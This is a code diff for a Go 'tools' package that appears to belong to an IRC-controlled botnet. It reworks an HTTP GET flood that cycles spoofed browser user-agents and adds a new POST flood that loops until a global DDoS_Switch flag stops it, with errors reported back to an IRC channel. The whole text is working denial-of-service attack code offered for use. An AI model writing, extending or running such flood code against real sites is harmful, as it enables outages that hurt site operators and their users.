@@ -1,6 +1,7 @@
 package tools
 
 import (
+	"encoding/json"
 	"fmt"
 	"math/rand"
 	"net"
@@ -15,7 +16,7 @@ import (
 
 var DDoS_Switch bool
 
-func HTTP(getTarget, set_chan string, reportIRC net.Conn) {
+func GET(getTarget, set_chan string, reportIRC net.Conn) {
 	agent_array := []string{
 		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
@@ -23,18 +24,39 @@ func HTTP(getTarget, set_chan string, reportIRC net.Conn) {
 		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
 	}
-	request, err := http.NewRequest("GET", getTarget+"/"+"user-agent", nil)
+	get_request, err := http.NewRequest("GET", getTarget+"/"+"user-agent", nil)
 	if err != nil {
 		IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+err.Error())
 	}
-	_http := &http.Client{}
+	_get := &http.Client{}
 
 	for {
 		for i := range agent_array {
-			request.Header.Set("User-Agent", agent_array[i])
-			__http, _ := _http.Do(request)
-			__http.Body.Close()
+			get_request.Header.Set("User-Agent", agent_array[i])
+			_get.Do(get_request)
 		}
+		if DDoS_Switch {
+			break
+		}
+	}
+}
+
+func POST(postTarget, set_chan string, reportIRC net.Conn) {
+	buffer := make([]byte, 25)
+	reqBody, _ := json.Marshal(map[string]string{
+		"name":        string(buffer),
+		"description": string(buffer),
+		"type":        string(buffer),
+		"e-mail":      string(buffer),
+	})
+	post_request, err := http.NewRequest("POST", postTarget+"/"+string(reqBody), nil)
+	if err != nil {
+		IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+err.Error())
+	}
+	_post := &http.Client{}
+
+	for {
+		_post.Do(post_request)
 		if DDoS_Switch {
 			break
 		}
